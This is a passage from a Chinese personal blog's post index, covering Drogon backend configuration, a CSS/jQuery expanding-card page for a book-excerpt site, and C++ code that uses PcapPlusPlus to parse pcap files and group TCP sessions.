这里最坑的一点是，即便没有勾选这个选项，仍然能够通过编译、生成可执行文件，但你添加的功能都没办法生效。我此前根据文档添加了一个简单的控制器，结果并没有起作用。\n配置文件 Drogon项目生成的时候，自带一个 config.json 文件，该文件目前还没有进行深入的理解，但是我进行了以下几点：\n将 document_root 改为静态模板的文件夹，默认页面是 index.html 不变；\n把第 230 行的 simple_controllers_map 注释掉，因为目前还不需要进行控制器、过滤器等的添加：\n//\u0026#34;simple_controllers_map\u0026#34;: [ // { // \u0026#34;path\u0026#34;: \u0026#34;/path/name\u0026#34;, // \u0026#34;controller\u0026#34;: \u0026#34;controllerClassName\u0026#34;, // \u0026#34;http_methods\u0026#34;: [ // \u0026#34;get\u0026#34;, // \u0026#34;post\u0026#34; // ], // \u0026#34;filters\u0026#34;: [ // \u0026#34;FilterClassName\u0026#34; // ] // } //], 修改 main.cc 文件，把加载配置文件的那行代码取消注释：\ndrogon::app().loadConfigFile(\u0026#34;../../../config.json\u0026#34;); 至此，程序就可以运行了。\n运行 直接通过VS生成目标程序，可以参考资料 [2] 进行静态页面和控制器的简单使用。\n参考资料 [1] Visual Studio开源库集成器Vcpkg全教程\u0026ndash;利用Vcpkg轻松集成开源第三方库_chenjm的专栏-CSDN博客_vcpkg\n[2] CHN 03 快速开始 · drogonframework/drogon Wiki (github.com)\n","date":"2022-02-16T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%AF%BB%E4%B9%A6%E6%91%98%E6%8A%84%E7%AB%99%E7%82%B9%E6%9E%84%E5%BB%BA%E5%90%8E%E7%AB%AF%E7%AF%87%E4%B9%8B%E4%B8%80/","title":"读书摘抄站点构建（后端篇|之一）"},{"content":"终于下定决心构建一个属于自己的读书摘抄站点了！\n此前的读书摘抄一直都是写在一个Markdown文件里，然后通过OneDrive同步。这种原始的办法问题不大，但很低效，也谈不上视觉效果；面对偶发的要把某些极好的片段分享给好友的需求更是无能为力，只能截个图勉强作数。\n从现在开始呢，我希望一步步构建一下属于自己的读书摘抄站点；此前买的好几个月的腾讯云服务器一直闲置，近期可能就有他的用武之地了。\n开工大吉！ ☀️\n总体规划 这次要做的肯定是一个动态网站（In fact, 人生中第一个动态网站 /(ㄒoㄒ)/~~），大概的实施要点是：\n前后端分离（Maybe） 不设置账号了，因为使用范围比较私人；发布文章的接口是暴露的，但是发布摘抄之前要进行身份认证 加密压缩存储（看后期技术能力） 数据库定期备份 HTTPS 实现分享功能 前端尽量适应多设备 动态加载+加载时的页面动画 已经物色好了后端开发的框架： drogonframework/drogon: Drogon: A C++14/17/20 based HTTP web application framework running on Linux/macOS/Unix/Windows (github.com) ，感觉用C++开发后端非常酷炫，本身需要实现的功能也不是很多 ，大有可为！ 😼\nStep01 主体框架 在我的构思中，读书摘抄页面的主体应该是一个很简单的结构：\n摘抄列表类似于我个人博客的文章列表就行； 点击某个文段之后，触发缩放效果，文段成为页面中心，同时背景虚化。 正在我犹豫迷茫的时候，发现了 Steven 大佬的 【CSS】App Store 卡片展开效果 视频！Amazing！\n我很快决定页面主体就基于他的这个视频了。下面的内容假设你已经实现了Steven在视频中介绍的所有效果。\n我照着视频实现的总的代码为：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en-us\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Test\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.googleapis.com\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.gstatic.com\u0026#34; crossorigin\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css2?family=Long+Cang\u0026amp;family=Ma+Shan+Zheng\u0026amp;family=Noto+Sans+SC:wght@300\u0026amp;family=Noto+Serif+SC:wght@300\u0026amp;family=Zhi+Mang+Xing\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;style\u0026gt; :root { font-size: 15px; font-family: \u0026#39;Zhi Mang Xing\u0026#39;, cursive; --body-width: 100%; --card-width: 420px; --card-height: 280px; --img-height: 226px; --img-height-expended: 320px; background-color: #333; } body { width: var(--body-width); background-color: #eee; margin: auto; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 1rem 0; } body.noscroll { overflow: hidden; } .card { width: var(--card-width); height: var(--card-height); background-color: #fff; border-radius: 1rem; box-shadow: 0 .2rem 2rem rgba(0, 0, 0, .1); margin: 1rem 0; transition: .3s all cubic-bezier(0, 1, 0.95, 1.05); } .card img { display: block; width: 100%; height: var(--img-height); object-fit: cover; border-top-left-radius: 1rem; border-top-right-radius: 1rem; } .card h4 { margin: 0; font-size: 1.5rem; font-weight: bold; padding: .8rem 1.2rem; background-color: #fff; line-height: 2rem; letter-spacing: -.5px; padding-bottom: 0; } .card .content-wrapper { height: 0; overflow: hidden; transition: .3s all ease-out; opacity: .8; } .card .content-wrapper .content { padding: 0 1.2rem; background-color: #fff; overflow: auto; } .card p { font-size: 1.2rem; line-height: 1.5rem; } /* active classes */ .card.active { transform: translateY(var(--data-offset-top)) scale(calc(480/420)); transform-origin: 50% 0; border-radius: 0; } .card.active h4 { padding-bottom: .8rem; } .card.active img { border-top-left-radius: 0; border-top-right-radius: 0; height: var(--img-height-expended); } .card.active .content-wrapper { height: 100vh; transition: .3s all ease-in; opacity: 1; } ::-webkit-scrollbar { width: 20px; } ::-webkit-scrollbar-track { background-color: transparent; } ::-webkit-scrollbar-thumb { background-color: #d6dee1; border-radius: 20px; border: 6px solid transparent; background-clip: content-box; } ::-webkit-scrollbar-thumb:hover { background-color: #a8bbbf; } \u0026lt;/style\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.onload = function() { $(\u0026#39;.card\u0026#39;).on(\u0026#39;click\u0026#39;, function (e) { let card = $(e.currentTarget); let card_offset_scrolltop = $(card).offset().top - $(window).scrollTop(); $(card).css(\u0026#39;--data-offset-top\u0026#39;, card_offset_scrolltop * -1 + \u0026#39;px\u0026#39;); $(card).toggleClass(\u0026#39;active\u0026#39;); let height = $(window).height(); let ratio = 480/420; height -= $(card).find(\u0026#39;img\u0026#39;).outerHeight() * ratio; height -= $(card).find(\u0026#39;h4\u0026#39;).outerHeight() * ratio; height /= ratio; $(card).find(\u0026#39;.content\u0026#39;).css(\u0026#39;height\u0026#39;, height); if ($(card).hasClass(\u0026#39;active\u0026#39;)) { $(\u0026#39;body\u0026#39;).addClass(\u0026#39;noscroll\u0026#39;); } else { $(\u0026#39;body\u0026#39;).removeClass(\u0026#39;noscroll\u0026#39;); } }); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://source.unsplash.com/900x600/?nature,water,1\u0026#34; /\u0026gt; \u0026lt;h4\u0026gt;Title1\u0026lt;/h4\u0026gt; \u0026lt;div class=\u0026#34;content-wrapper\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://source.unsplash.com/900x600/?nature,water,2\u0026#34; /\u0026gt; \u0026lt;h4\u0026gt;Title2\u0026lt;/h4\u0026gt; \u0026lt;div class=\u0026#34;content-wrapper\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://source.unsplash.com/900x600/?nature,water,3\u0026#34; /\u0026gt; \u0026lt;h4\u0026gt;Title3\u0026lt;/h4\u0026gt; \u0026lt;div class=\u0026#34;content-wrapper\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://source.unsplash.com/900x600/?nature,water,4\u0026#34; /\u0026gt; \u0026lt;h4\u0026gt;Title4\u0026lt;/h4\u0026gt; \u0026lt;div class=\u0026#34;content-wrapper\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Step02 移除图片\u0026amp;样式调整 Steven大佬做出来的效果，对 img 的操作占了比较大的部分；不过我的需求是文字摘抄，并不需要这么多的图片，因此决定将这些图片移除掉。同时，把CSS中关于图片的样式也全部移除。\n此外，在demo中限定了 --card-width: 420px ，这是因为作者假设了使用场景是小屏幕；我的使用场景不是小屏幕，因此将这个数值改大一些： --card-width: 80% 。\n现有的布局结构是一个 card 下有一个标题 h4 和内容部分 content-wrapper ，我决定将他们全部保留，不过移除了图片之后，样式变得有点奇怪，需要进行一些调整。\n卡片高度要缩小，因为已经没有图片了； 内容展示的时候不能展示完全，只呈现出三行，超过部分用省略号替代；同时，点开内容之后要把这些限制去掉； 保留圆角（调了蛮久才搞出来，感觉最终的代码并不是很简洁）； 滚动条美化（老技能了）。 调整之后的CSS变为：\n:root { font-size: 15px; font-family: \u0026#39;Zhi Mang Xing\u0026#39;, cursive; --body-width: 100%; --card-width: 80%; --card-height: 150px; background-color: #333; } ::-webkit-scrollbar { width: 20px; background-color: #eee; } ::-webkit-scrollbar-track { background-color: transparent; } ::-webkit-scrollbar-thumb { background-color: #d6dee1; border-radius: 20px; border: 6px solid transparent; background-clip: content-box; } ::-webkit-scrollbar-thumb:hover { background-color: #a8bbbf; } body { width: var(--body-width); background-color: #eee; margin: auto; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 1rem 0; } body.noscroll { overflow: hidden; } .card { width: var(--card-width); height: var(--card-height); background-color: #fff; border-radius: 1rem; box-shadow: 0 .2rem 2rem rgba(0, 0, 0, .1); margin: 1rem 0; transition: .3s all cubic-bezier(0, 1, 0.95, 1.05); } .card h4 { margin: 0; font-size: 1.8rem; font-weight: bold; padding: .8rem 1.2rem; background-color: #fff; line-height: 2rem; letter-spacing: -.5px; padding-bottom: 0; border-radius: 1rem; } .card .content-wrapper { transition: .3s all ease-out; opacity: .8; } .card .content-wrapper .content { padding: 0 1.2rem; background-color: #fff; overflow: hidden; display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 3; border-radius: 1rem; } .card p { font-size: 1.5rem; line-height: 2rem; } /* active classes */ .card.active { transform: translateY(var(--data-offset-top)) scale(calc(480/420)); transform-origin: 50% 0; border-radius: 0; z-index: 99; } .card.active h4 { padding-bottom: .8rem; } .card.active .content-wrapper { height: 100vh; transition: .3s all ease-in; opacity: 1; } .card.active .content-wrapper .content { display: block; height: 80%; } 目前的效果（动图） 完成了以上的微调之后，需要进行细节部分的大改动了，我将分为几个细节来进行处理。\n滚动条美化 滚动条美化是此前对个人博客进行优化时接触过的东西，总体来说就是使用CSS一系列选择器来选中滚动条的对应部分。在上面的CSS中，我将滚动条背景颜色设置为了 #eee ，即正常情况下的背景颜色，而这导致了一个问题：当我点开一个具体的摘抄，其中文字内容需要进行滚动时，滚动条的颜色跟卡片颜色有点不协调，很出戏。\n当前滚动条背景的不协调 优化的思路很简单，使用一个CSS变量来设置颜色；配合此前已经有了的jQuery对点击事件的判断，改变这个背景颜色即可。\n既然已经提到了使用变量，我就 统一将各个背景颜色全部使用变量进行控制 ，作出的相应修改在此不表。\n使用 --scrollbar-bg-color: #eee; 作为滚动条默认背景颜色（与 body 背景颜色一致），在jQuery判断点击的那部分代码中加上对这个颜色变量的控制：\nif ($(card).hasClass(\u0026#39;active\u0026#39;)) { $(\u0026#39;body\u0026#39;).addClass(\u0026#39;noscroll\u0026#39;); $(\u0026#39;:root\u0026#39;).css(\u0026#39;--scrollbar-bg-color\u0026#39;, \u0026#39;#fff\u0026#39;); } else { $(\u0026#39;body\u0026#39;).removeClass(\u0026#39;noscroll\u0026#39;); $(\u0026#39;:root\u0026#39;).css(\u0026#39;--scrollbar-bg-color\u0026#39;, \u0026#39;#eee\u0026#39;); } 搞定！\n卡片缩放美化 Steven大佬的卡片缩放，由于有一张尺寸较大的图，使得原本“顶天立地”的缩放效果就显得很出色。在我的使用场景中，已经将图片去掉了，如果继续“顶天立地”下去，就会造成卡片下端的大量空白。\n卡片下端大量空白 毫无疑问，这样的效果是很不好的，即便我后续将要对卡片的结构进行一些调整，读书摘抄这种有限的内容仍然很难铺满一个浏览器窗口。\n我的理想放大效果是：内容基本位于窗口中心，上下左右都留出一些空白。\n基于原有的代码，要实现内容居中较为容易。原本的代码会计算 --data-offset-top ，然后对卡片进行一个 translateY 的操作，将卡片移到页面顶部；我不希望卡片“头顶天”，因此将这个 --data-offset-top 的值修改一下即可。\n具体的操作是：先获取 $(window).height() 即窗口高度，然后把 --data-offset-top 加上窗口高度的一定比例。\n实现出来的效果类似于为卡片加上了 margin-top 。\n而为了不让卡片“脚着地”，只需要把卡片的 height 减小即可。在原本的代码中，这个高度通过 .card.active .content-wrapper 来控制，我将其改为一个变量 var(--content-wrapper-height-expended) ，在卡片展开的时候，设置这个变量的值为窗口高度的一定比例。\n同时，为了不让 content 把 content-wrapper 撑大，要为这个元素设置 height ，使它至多跟父元素同样高。\n实现出来的效果类似于为卡片加上了 margin-bottom 。\n对卡片展开的比例进行调整之后，大小是合理了，不过出现了新的问题：\n背后的文字没有隐藏掉 这个问题实际上花了我一段时间，最后的解决方案是：新增一个全屏的“遮罩”元素，背景颜色设置好透明度；遮罩在正常情况下 z-index 较小且 display 为 none ，卡片展开之后把 z-index 抬升到 展开的卡片之下、未展开的卡片之上 的位置，然后 display 呈现出来。\n最终缩放效果 注意这边展开之后看起来右边没有间隙，实际上是GIF录制过程中的范围有限所致。\n点击事件优化 原本的卡片缩放实现方案是：在 click 事件中进行 toggleClass 的操作来添加/移除 active 这个类，逻辑很简单，但并不完全实用。\n其中很关键的一点是：当我选中一段文字时，也算作触发 click 事件；而毫无疑问，当读者选中某些文字的时候希望进行的是复制之类的操作，假如触发了 click 事件，卡片就会缩回去，选中的文字也就丢失了。\n点击事件意外触发 修复它的做法比较简单：在 click 事件中判断一下当前是否选中了文本，若存在，则说明卡片缩放的步骤不应该执行，否则再按照原有的流程执行卡片缩放。\nlet txt = \u0026#39;\u0026#39;; if (window.getSelection) { txt = window.getSelection().toString(); } else { txt = document.selection.createRange().text; } if (txt == \u0026#39;\u0026#39;) { // 原有的卡片缩放步骤 } 修复后的点击事件 缩放事件优化 卡片展开之后缩回，存在一个不到位的细节是：内容没有回到首行。\n缩放细节不到位 这使得体验很割裂，尤其当我添加了 书籍名称 、 发布日期 等元素之后，出现了重叠。\n解决的办法是：在卡片回弹的函数中，选中 content-wrapper 并将使用 scrollTop(0) 将它的偏移量重置为 0 。\nStep03 添加伸缩侧边栏 在一个读书摘抄的站点中，根据书籍进行分类应该是最基本的需求。\n我的构思是添加一个可伸缩的侧边栏，侧边栏上呈现出所有的书籍，点击时进行异步通信，后台根据书籍名称筛选读书摘抄。\n实现这个侧边栏需要对页面结构进行如下的调整：\n在原有的若干卡片外层再添加一个 div 包裹起来，实现完整性； 添加一个 position: fixed 的元素，放置在页面右侧； 添加一个可点击的元素，点击之后触发侧边栏伸缩。 侧边栏元素的添加比较简单：假定侧边栏的宽度是 10% ，由于使用了 fixed 属性使得宽度比例的计算按照外层窗体进行，因此 body 要为侧边栏让出 10% 的空间，使用 padding-right: 10% 实现；\n按照相同办法添加一个 fixed 元素充当按钮，注意计算按钮位置即可。按钮点击时判断侧边栏是否有宽度，若有，说明应该将侧边栏收缩，修改侧边栏宽度和 body 的 padding-right 为零；若侧边栏无宽度，说明应该展开，将二者改回原有的 10% 即可。\n侧边栏中要放置书籍名称，使用类似于主体部分的卡片的布局进行实现；书籍名称的文字部分使用 writing-mode: vertical-rl; 和 text-align: center; 来使文字居中垂直排列。\n最终效果 Step04 侧边栏进一步完善 原本以为上一步添加的侧边栏就很够用了，可惜需求总是随着人类的异想天开而不断增加。\n这一步骤主要完善两点功能：\n站点需要对用户的登录状态进行判定，因此决定将用户的登录状态和登录接口放置在侧边栏上； 原有的侧边栏卡片有一些小问题，修复。 第一步相当于在侧边栏上又新增一个元素了。在若干个书籍卡片 之前 新增一个 \u0026lt;div id=\u0026quot;authentication\u0026quot;\u0026gt; ，我的设想是 用户未登录之前显示登录入口、用户登录之后显示一个头像图片 ，当然，目前肯定是不支持更换头像的，因此图片按我的喜好来 😸\n未登录状态就使用 未登录 三个字来表示即可，用一个 \u0026lt;a\u0026gt; 标签把它做成链接；设置这个标签的 position: relative ，然后使用 ::before 伪元素来实现鼠标 hover 的效果：\n未登录链接 登录状态使用一张正方形图片，然后 border-radius: 100% 改为圆形，不表。注意正常情况下图片总是能吸引用户点击，因此我希望将这个图片作为发布读书摘抄的入口。\n接着是一个极其重要的改动：侧边栏滚动的启用。此前的布局看起来没有什么毛病，但当书籍多起来之后，就会：\n书籍变多之后的侧边栏 卡片被压缩了！这不是我的本意，我希望书籍多起来之后侧边栏可以向下滚动，不要挤在这么一个小空间里。\n修改的办法是：\n在卡片样式中（即 #right-sidebar .book-card 选择器）加上 flex-shrink: 0; ； 侧边栏样式中（即 #right-sidebar 选择器）加上 overflow: scroll; ； 侧边栏滚动条隐藏（使用 #right-sidebar::-webkit-scrollbar 选择器设置 display: none ）。 至此先告一段落啦！\n","date":"2022-02-12T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%AF%BB%E4%B9%A6%E6%91%98%E6%8A%84%E7%AB%99%E7%82%B9%E6%9E%84%E5%BB%BA%E9%A1%B5%E9%9D%A2%E7%AF%87%E4%B9%8B%E4%B8%80/","title":"读书摘抄站点构建（页面篇|之一）"},{"content":"前情提要 在 上一篇PCPP使用记录 中，我记录了PcapPlusPlus这个库的环境安装和简单使用，紧接着，就准备基于这个库来实现一些具体的、有用的功能了。\n数据包解析 PCPP这个库将一个原始数据包解析为若干层，每一层的协议信息由一个变量来保存，我们可以自由读写这些解析后的数据。\n一个 RawPacket 表示原始的字节流，也就是我们最开始从 pcap 文件中读进来的一个数据包，经过解析，可以将这个数据包拆分成我们熟悉的若干层数据！PCPP的一个特性是它不保存多个副本，而只是在同一个数据包上标记各层协议的起点，这些起点可以由上一层解析结果访问到。\n示例 例如这个图中的解析结果，首先是数据链路层的 Ethernet Layer ，它可以看到所有原始数据；由 Ethernet Layer 层扣除它的头部数据，就是整个 IPv4 层的数据；而由 IPv4 层再继续解析，就是 UDP 层啦！这样层层递推，实际上跟学习计算机网络的时候对数据包的解析顺序差不多。\nPCPP提供的数据包解析方法有两种，我们分别来看。\n首先还是需要先创建一个 reader ，如果你还记得第一章的内容，那就很简单了：\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;IPv4Layer.h\u0026gt; #include \u0026lt;Packet.h\u0026gt; #include \u0026lt;PcapFileDevice.h\u0026gt; int main(int argc, char* argv[]) { // Part 1 // open a pcap file for reading pcpp::IFileReaderDevice* reader = pcpp::IFileReaderDevice::getReader(\u0026#34;test_file_1.pcap\u0026#34;); if (!reader) { std::cerr \u0026lt;\u0026lt; \u0026#34;Cannot determine reader for file type\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } if (!reader-\u0026gt;open()) { std::cerr \u0026lt;\u0026lt; \u0026#34;Cannot open input.pcap for reading\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // read the first packet from the file pcpp::RawPacket rawPacket; if (!reader-\u0026gt;getNextPacket(rawPacket)) { std::cerr \u0026lt;\u0026lt; \u0026#34;Couldn\u0026#39;t read the first packet in the file\u0026#34; \u0026lt;\u0026lt; std::endl; return 1; } // ===== Code to write ===== reader-\u0026gt;close(); delete reader; return 0; } 上面是程序的基本框架，已经写好了创建Reader、读取第一个数据包 rawPacket 的部分。接下来的所有代码都追加在 Code to write 那块地方~\n首先需要创建一个解析后的数据包：\n// parse the raw packet into a parsed packet pcpp::Packet parsedPacket(\u0026amp;rawPacket); 在上面的介绍中，我们知道这个解析后的数据包是一层一层的结构，每一层都有一个指向下一层的指针，于是我们可以使用一个循环来遍历这些层：\n// first let\u0026#39;s go over the layers one by one and find out its type, its total length, its header length and its payload length for (pcpp::Layer* curLayer = parsedPacket.getFirstLayer(); curLayer != NULL; curLayer = curLayer-\u0026gt;getNextLayer()) { // Code to write } 在这个循环中呢， curLayer 就是当前获取到的层了！假如说我们需要使用到TCP层的信息，那就需要用API获取一下当前层的协议，然后判断 curLayer-\u0026gt;getProtocol() == pcpp::TCP ，真是有点麻烦！\n好在PCPP为我们提供了第二种获取协议层的方法：\npcpp::IPv4Layer* ipLayer = parsedPakcet.getLayerOfType\u0026lt;IPv4Layer\u0026gt;(); 直接使用 getLayerOfType 这个接口来获取我们想要的层，很酷！\n在我接下来的场景中，使用到的是网络层的IP地址和传输层的端口，那么就只需要：\npcpp::TcpLayer* tcpLayer = parsedPakcet.getLayerOfType\u0026lt;TcpLayer\u0026gt;(); pcpp::IPv4Layer* ipLayer = parsedPakcet.getLayerOfType\u0026lt;IPv4Layer\u0026gt;(); 方便得很！\n当我们获取到某个特定的层之后，就可以来使用这一层的信息了。在VS环境中有自动补全，使用 tcpLayer-\u0026gt;getxxxxxx() 这样的格式，一般就能看到这一层包含的信息。例如本次使用较多的有：\nIPv4Address\tipLayer-\u0026gt;getSrcIPv4Address(); uint16_t tcpLayer-\u0026gt;getSrcPort(); tcphdr*\ttcpLayer-\u0026gt;getTcpHeader()-\u0026gt;synFlag 这几个API从名字上就很容易看出它们是什么作用！如果想进行更多的解析，可以看参考资料 [1] 和参考资料 [3] 😁 ​\n并不成功的会话切分 所谓 会话分割 ，就是说给出一个很大的 pcap 文件，里面有超级多的数据包，我们要把它按照一个个的TCP会话（或者叫TCP连接，whatever）整理好！\n这一工作很有意义！TCP会话一般是数据传输的一个基本单元，它以三次握手开始、以四次挥手结束。譬如以前的HTTP协议，传输一个文件就使用一个TCP会话，即使引入了长连接，也是在一个相对完整的语境中（如一个网页的加载）使用一次TCP会话，所以一个TCP会话的背后可能就是用户的一次网络行为！很多基于网络流量的行为分析技术都是基于TCP会话的，学者们提取TCP会话的各种特征信息，然后使用各种模型，希望把网络流量跟它背后的用户行为对应起来 😹 我们今天还做不到这么多啦，但是从 pcap 文件中整理出一个个TCP会话来，还是可以试试的~\n实验目标：整理出会话的开始时间和结束时间，可以顺便计算一下时长 。\nAll right？先讲思路，再说不足，最后慢慢改进。\n我基本的思路是使用一个 四元组 来保存连接信息。熟悉TCP的朋友应该知道，一个TCP连接可以由 (SrcIP, DstIP, SrcPort, DstPort) 这个元组唯一确定，其实就是两端的 Socket 啊！\n这么一个元组怎么储存呢？我的做法是进行一个简单的字符串拼接：\nstring keyTuple = ipLayer-\u0026gt;getSrcIPv4Address().toString() + \u0026#34; \u0026#34; + ipLayer-\u0026gt;getDstIPv4Address().toString() + \u0026#34; \u0026#34; + to_string(tcpLayer-\u0026gt;getSrcPort()) + \u0026#34; \u0026#34; + to_string(tcpLayer-\u0026gt;getDstPort()); 我们要做的是 整理出会话的开始时间和结束时间 ，还记得吗？\n我最初的想法是：对每个数据包进行分析，如果数据包中包含 SYN ，说明它是会话的开始，放入一个 map 中；如果数据包中包含 FIN ，说明它是会话的结束，依据这个数据包的四元组从 map 中获取开始时间，然后使用当前数据包的时间作为结束时间，打印！\n总的代码为：\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;IPv4Layer.h\u0026gt; #include \u0026lt;TcpLayer.h\u0026gt; #include \u0026lt;Packet.h\u0026gt; #include \u0026lt;PcapFileDevice.h\u0026gt; #include \u0026lt;set\u0026gt; #include \u0026lt;map\u0026gt; #include \u0026lt;ctime\u0026gt; #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;iomanip\u0026gt; using namespace pcpp; using namespace std; #define MY_FORMAT setw(18) \u0026lt;\u0026lt; setiosflags(ios::left) IFileReaderDevice* openFileReader(string fileName) { IFileReaderDevice* openedReader = IFileReaderDevice::getReader(fileName); if (!openedReader) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot determine reader for file type\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } if (!openedReader-\u0026gt;open()) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot open input.pcap for reading\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } return openedReader; } void printSplitedTuple(string s) { int prevFind = -1; int nowFind; while ((nowFind = s.find(\u0026#34; \u0026#34;, prevFind + 1)) != string::npos) { cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; s.substr(prevFind + 1, nowFind - prevFind); prevFind = nowFind; } cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; s.substr(prevFind + 1); } int main(int argc, char* argv[]) { // open a pcap file for reading string pcapFile = \u0026#34;test_file_1.pcap\u0026#34;; IFileReaderDevice* reader = openFileReader(pcapFile); if (!reader-\u0026gt;setFilter(\u0026#34;tcp\u0026#34;)) { cerr \u0026lt;\u0026lt; \u0026#34;Cannot set filter for file reader\u0026#34; \u0026lt;\u0026lt; endl; exit(EXIT_FAILURE); } RawPacket rawPacket; multimap\u0026lt;string, timespec\u0026gt; sessionMap; auto BEGIN = clock(); while (reader-\u0026gt;getNextPacket(rawPacket)) { Packet parsedPakcet(\u0026amp;rawPacket); TcpLayer* tcpLayer = parsedPakcet.getLayerOfType\u0026lt;TcpLayer\u0026gt;(); IPv4Layer* ipLayer = parsedPakcet.getLayerOfType\u0026lt;IPv4Layer\u0026gt;(); string keyTuple = ipLayer-\u0026gt;getSrcIPv4Address().toString() + \u0026#34; \u0026#34; + ipLayer-\u0026gt;getDstIPv4Address().toString() + \u0026#34; \u0026#34; + to_string(tcpLayer-\u0026gt;getSrcPort()) + \u0026#34; \u0026#34; + to_string(tcpLayer-\u0026gt;getDstPort()); if (tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;synFlag == 1) { sessionMap.insert(pair\u0026lt;string, timespec\u0026gt;(keyTuple, rawPacket.getPacketTimeStamp())); } if (tcpLayer-\u0026gt;getTcpHeader()-\u0026gt;finFlag == 1) { auto sessionStart = sessionMap.find(keyTuple); if (sessionStart != sessionMap.end()) { cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Src\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Dst\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;SrcPort\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;DstPort\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Start\u0026#34; \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;End\u0026#34;\u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; \u0026#34;Duration\u0026#34; \u0026lt;\u0026lt; endl; printSplitedTuple(keyTuple); double startTime = sessionStart-\u0026gt;second.tv_sec + (double)sessionStart-\u0026gt;second.tv_nsec / 1e9; double endTime = rawPacket.getPacketTimeStamp().tv_sec + (double)rawPacket.getPacketTimeStamp().tv_nsec / 1e9; cout \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; sessionStart-\u0026gt;second.tv_sec \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; rawPacket.getPacketTimeStamp().tv_sec \u0026lt;\u0026lt; MY_FORMAT \u0026lt;\u0026lt; setprecision(5) \u0026lt;\u0026lt; (endTime - startTime) \u0026lt;\u0026lt; endl; sessionMap.erase(sessionStart); } } } auto END = clock(); cout \u0026lt;\u0026lt; \u0026#34;Total time: \u0026#34; \u0026lt;\u0026lt; double(END - BEGIN) / CLK_TCK * 1000 \u0026lt;\u0026lt; \u0026#34;ms.\u0026#34; \u0026lt;\u0026lt; endl; reader-\u0026gt;close(); delete reader; return 0; } 上面的代码使用了 rawPacket.getPacketTimestamp() 来获取数据包的时间戳，返回结果是一个 timespec 类型！这个类型表示从日历起点到现在所经过的秒数，它的第一部分是 秒 ，第二部分是 纳秒 ，我使用了 秒 来打印会话开始时间和结束时间，使用了 纳秒 来计算会话持续时间。\n此外，为了输出结果的美观，我定义了一个 MY_FORMAT 宏，将输出的字符串指定为 18 个宽度，方便对齐。\n输出结果 这次的运行花了5秒多！结果看着蛮厉害，其实问题有很多 😢 这些问题是在我基本上完成了这个程序之后，逐渐意识到的。\n元组的表示问题 